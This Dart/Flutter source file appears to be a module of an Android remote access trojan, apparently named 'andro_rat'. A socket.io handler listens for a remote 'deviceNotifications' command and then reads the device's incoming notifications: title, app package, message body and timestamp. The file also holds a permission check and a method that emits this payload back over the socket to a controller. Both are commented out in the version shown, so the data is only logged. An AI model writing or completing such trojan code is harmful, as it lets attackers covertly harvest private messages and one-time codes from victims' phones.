import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:notification_reader/notification_reader.dart';
import 'package:notifications/notifications.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;

class DeviceNotifications {
  static const String remoteTrigger = "deviceNotifications";
  late SocketIO.Socket _socket;
  
  Future<Map> getPayload({ String? upon }) async {
    final payload = <String, dynamic> { "upon": upon ?? "request" };
    
    // if (await _checkPoint()) {
    //   Debug.log("Checkpoint passed");

      final NotificationData data = await NotificationReader.onNotificationRecieve();
      Debug.log("[Notification Received]:");
      // Debug.log(data);
      Debug.log(data.title);
      Debug.log(data.packageName);
      Debug.log(data.body);

      // Debug.log(data.data);
      Debug.log(":[End Notification Received]");
    // } else {
    //   Debug.log("Checkpoint failed");
    // }
    
    return payload;
  }

  Future<bool> _checkPoint() async {
    if (await Permission.notification.isGranted) {
      return Future.value(true);
    } else {
      // await NotificationReader.openNotificationReaderSettings;
      return await Permission.notification.request().isGranted;
    }
  }

  void registerEvents(SocketIO.Socket socket) {
    _socket = socket;

    _socket.on(remoteTrigger, (_) async {
      await sendPayload();
    });
    
    _addListeners();
  }
  
  void _addListeners() {

  }

  void _sendPayload(String remoteTrigger, payload) {
    _socket.emit(remoteTrigger, payload);
  }
  
  Future<void> sendPayload({ String? upon }) async {
    Debug.log("[Sending Notifications]:");
    // await getPayload();
    Notifications n = Notifications();
    var s = n.notificationStream?.listen((event) {
      Debug.log(event.timeStamp);
      Debug.log(event.title);
      Debug.log(event.packageName);
      Debug.log(event.message);

      Debug.log(event);
    });

    // _sendPayload(remoteTrigger, await getPayload(upon: upon));
    Debug.log(":[End Sending Notifications]");
  }
  
}